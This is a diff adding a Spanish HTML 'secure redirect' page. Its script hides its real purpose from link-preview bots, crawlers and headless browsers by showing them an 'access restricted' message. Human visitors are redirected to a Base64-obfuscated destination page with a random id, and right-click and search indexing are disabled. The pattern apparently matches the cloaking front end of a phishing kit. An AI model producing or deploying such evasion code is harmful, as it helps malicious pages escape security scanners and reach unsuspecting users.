@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="NOINDEX,NOFOLLOW,NOARCHIVE,NOODP,NOSNIPPET">
+    <title>Redirección segura</title>
+</head>
+<body oncontextmenu="return false">
+
+<script>
+// Función para decodificar Base64
+function decodeBase64(str) {
+    return atob(str);
+}
+
+// Detecta bots conocidos
+function isBot() {
+    const bots = [
+        /facebookexternalhit/i,
+        /Facebot/i,
+        /Twitterbot/i,
+        /Slackbot-LinkExpanding/i,
+        /Discordbot/i,
+        /TelegramBot/i,
+        /Googlebot/i,
+        /Bingbot/i,
+        /crawler/i,
+        /spider/i,
+        /preview/i
+    ];
+    return bots.some(bot => bot.test(navigator.userAgent));
+}
+
+// Detecta entornos headless (navegadores sin GUI, típicos de scrapers)
+function isHeadless() {
+    return navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent);
+}
+
+// Ejecutar lógica de protección y redirección
+(function () {
+    if (isBot() || isHeadless()) {
+        document.body.innerHTML = "<h1>Acceso restringido</h1>";
+        return;
+    }
+
+    // Redirección segura (nombre del archivo en Base64)
+    const encodedUrl = "dmlld2VyLm5ldC5odG1s"; // Base64 de "viewer.net.html"
+    const destination = decodeBase64(encodedUrl);
+    const suffix = Math.random().toString(36).substring(2, 9); // cadena aleatoria
+    window.location.href = `./${destination}?id=${suffix}`;
+})();
+</script>
+
+</body>
+</html>
